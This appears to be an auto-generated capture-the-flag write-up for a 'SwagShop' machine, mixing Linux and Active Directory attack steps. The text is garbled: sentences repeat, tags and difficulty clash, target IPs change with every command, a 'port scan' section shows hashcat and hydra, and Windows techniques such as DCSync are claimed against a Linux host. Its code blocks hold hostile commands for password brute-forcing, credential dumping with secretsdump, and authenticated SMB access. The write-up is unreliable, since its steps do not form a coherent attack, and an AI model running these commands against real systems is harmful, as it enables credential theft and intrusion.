---
TitleSEO: "PwnTillDawn — SwagShop (Medium Linux) | ZureFX"
TitlePost: "PwnTillDawn — SwagShop (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn SwagShop. DCSync and AlwaysInstallElevated to achieve medium compromise on Linux."
Keywords: "reversing, active directory, hard, ctf, tryhackme, easy, pwntilldawn"
URL: "https://zurefx.github.io/writeups/htb-swagshop-963.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-swagshop-963/"
Date: "2025-03-16"
Tags: "Reversing, Active Directory, Hard, CTF, TryHackMe, Easy, PwnTillDawn"
Section: "writeups"
Lang: "en"
main_img: "htb-swagshop-963"
Permalink: "/writeups/htb-swagshop-963.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **SwagShop** is rated **Medium** on PwnTillDawn. It runs **Linux** and the IP address during this analysis was `10.18.9.222`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.105.238.92 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Initial enumeration revealed several interesting open ports on the target. The backup files contained sensitive information that should not have been accessible.

### Service Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.59.39.107
gobuster dir -u http://10.53.127.34/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges.

### SMB Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality.

```bash
crackmapexec smb 10.85.159.13 -u administrator -p 'P@ssw0rd!' --shares
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The kernel version was outdated and vulnerable to a publicly known exploit. The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit.

## Exploitation

### Vulnerability Identification

Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target.

Key finding: **Remote Code Execution**.

Unconstrained delegation was enabled on the compromised machine. The service account had excessive permissions assigned in Active Directory.

### Initial Access

Privilege escalation was possible due to misconfigured sudo permissions. The application stored sensitive credentials in an unencrypted configuration file.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.93.40.89 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

The database credentials were hardcoded in the application source code. Post-exploitation enumeration revealed a path to domain administrator privileges. Command injection was possible through unsanitized user input in the search functionality.

## Privilege Escalation

### Enumeration

Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.95.164.23 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.25.92.95 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

```bash
gobuster dir -u http://10.108.63.36/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.17.15.211/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.89.10.47/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.47.31.147
```

The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

## Summary

### Tools Used

- `hashcat`
- `dcomexec`
- `evil-winrm`
- `metasploit`
- `gobuster`
- `rubeus`
- `sqlmap`
- `smbclient`

### Key Takeaways

- DCSync
- AlwaysInstallElevated
- Path Traversal
- Remote Code Execution
